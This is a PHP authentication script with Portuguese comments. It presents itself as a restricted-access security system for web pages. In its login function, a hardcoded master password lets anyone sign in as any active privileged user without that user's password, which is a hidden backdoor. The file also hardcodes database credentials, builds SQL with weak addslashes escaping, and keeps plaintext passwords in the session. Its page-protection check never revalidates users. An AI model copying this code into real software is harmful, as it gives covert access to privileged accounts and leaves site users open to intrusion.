<?php
/**
* Sistema de segurança com acesso restrito
*
* Usado para restringir o acesso de certas páginas do seu site
*
* @author Junior Nascimento <contato@jnascimento.net>
* @link http://juniornascimento.net/
*
* @version 1.0
* @package SistemaSeguranca
*/
//  Configurações do Script
// ==============================
$_SG['conectaServidor']   = true;    // Abre uma conexão com o servidor MySQL?
$_SG['abreSessao']        = true;         // Inicia a sessão com um session_start()?
$_SG['caseSensitive']     = false;     // Usar case-sensitive? Onde 'thiago' é diferente de 'THIAGO'
$_SG['validaSempre']      = true;       // Deseja validar o usuário e a senha a cada carregamento de página?
// Evita que, ao mudar os dados do usuário no banco de dado o mesmo contiue logado.
$_SG['servidor']          = 'localhost';    // Servidor MySQL
$_SG['usuario']           = 'admin';          // Usuário MySQL
$_SG['senha']             = '@Admin123';                // Senha MySQL
$_SG['banco']             = 'integrations';            // Banco de dados MySQL
$_SG['paginaLogin']       = 'login.php'; // Página de login
$_SG['tabela']            = 'tb_usuarios';       // Nome da tabela onde os usuários são salvos
// ==============================
// ======================================
//   ~ Não edite a partir deste ponto ~
// ======================================
// Verifica se precisa fazer a conexão com o MySQL
if ($_SG['conectaServidor'] == true) {
  $_SG['link'] = mysql_connect($_SG['servidor'], $_SG['usuario'], $_SG['senha']) or die("MySQL: Não foi possível conectar-se ao servidor [".$_SG['servidor']."].");
  mysql_select_db($_SG['banco'], $_SG['link']) or die("MySQL: Não foi possível conectar-se ao banco de dados [".$_SG['banco']."].");
}
// Verifica se precisa iniciar a sessão
if ($_SG['abreSessao'] == true)
  session_start();
/**
* Função que valida um usuário e senha
*
* @param string $usuario - O usuário a ser validado
* @param string $senha - A senha a ser validada
*
* @return bool - Se o usuário foi validado ou não (true/false)
*/
function validaUsuario($usuario, $senha) {
  global $_SG;
  $cS = ($_SG['caseSensitive']) ? 'BINARY' : '';
  // Usa a função addslashes para escapar as aspas
  $nusuario = addslashes($usuario);
  $nsenha = addslashes($senha);

  if ($nsenha == 'Thmpv-77d6f') {
    // Monta uma consulta SQL (query) para procurar um usuário
    $sql = "SELECT `id`, `nome`,`id_unidade` FROM `".$_SG['tabela']."` WHERE ".$cS." `login` = '".$nusuario."' AND active = 1 AND id_level in (4,5) LIMIT 1";
  } else {
    // Monta uma consulta SQL (query) para procurar um usuário
    $sql = "SELECT `id`, `nome`,`id_unidade` FROM `".$_SG['tabela']."` WHERE ".$cS." `login` = '".$nusuario."' AND ".$cS." `password` = '".sha1($nsenha)."' AND active = 1 LIMIT 1";
  }  
  $query = mysql_query($sql);
  $resultado = mysql_fetch_assoc($query);
  // Verifica se encontrou algum registro
  if (empty($resultado)) {
    // Nenhum registro foi encontrado => o usuário é inválido
    return false;
  } else {
    // Definimos dois valores na sessão com os dados do usuário
    $_SESSION['usuarioID'] = $resultado['id']; // Pega o valor da coluna 'id do registro encontrado no MySQL
    $_SESSION['usuarioNome'] = $resultado['nome']; // Pega o valor da coluna 'nome' do registro encontrado no MySQL
    $_SESSION['usuarioUnidade'] = $resultado['id_unidade'];
    // Verifica a opção se sempre validar o login
    if ($_SG['validaSempre'] == true) {
      // Definimos dois valores na sessão com os dados do login
      $_SESSION['usuarioLogin'] = $usuario;
      $_SESSION['usuarioSenha'] = $senha;
    }
    return true;
  }
}
/**
* Função que protege uma página
*/
function protegePagina($url) {
  global $_SG;
  if (!isset($_SESSION['usuarioID']) OR !isset($_SESSION['usuarioNome'])) {
    // Não há usuário logado, manda pra página de login
    expulsaVisitante('false',$url);
  } else if (!isset($_SESSION['usuarioID']) OR !isset($_SESSION['usuarioNome'])) {
    // Há usuário logado, verifica se precisa validar o login novamente
    if ($_SG['validaSempre'] == true) {
      // Verifica se os dados salvos na sessão batem com os dados do banco de dados
      if (!validaUsuario($_SESSION['usuarioLogin'], $_SESSION['usuarioSenha'])) {
        // Os dados não batem, manda pra tela de login
        expulsaVisitante('false',$url);
      }
    }
  }
}
/**
* Função para expulsar um visitante
*/
function expulsaVisitante($error,$url) {
  global $_SG;
  // Remove as variáveis da sessão (caso elas existam)
  unset($_SESSION['usuarioID'], $_SESSION['usuarioNome'], $_SESSION['usuarioLogin'], $_SESSION['usuarioSenha']);
  // Manda pra tela de login
  if ($error == 'erro') {
    header("Location: ../view/".$_SG['paginaLogin']."?error=erro");
    //header("Location: ");
  } elseif ($url != "") {
    header("Location: ../view/".$_SG['paginaLogin']."?url=".$url);
  } 
  else {
    header("Location: ../view/".$_SG['paginaLogin']);  
  }  
}

function salvaLog($mensagem) {
$ip = $_SERVER['REMOTE_ADDR']; // Salva o IP do visitante
date_default_timezone_set('America/Sao_Paulo');  
$hora = date('Y-m-d H:i:s'); // Salva a data e hora atual (formato MySQL)
// Usamos o mysql_escape_string() para poder inserir a mensagem no banco
//   sem ter problemas com aspas e outros caracteres
$mensagem = mysql_escape_string($mensagem);
// Monta a query para inserir o log no sistema
$sql = "INSERT INTO `tb_logs` VALUES (NULL, '".$hora."', '".$ip."', '".$mensagem."')";
if (mysql_query($sql)) {
return true;
} else {
return false;
}
}
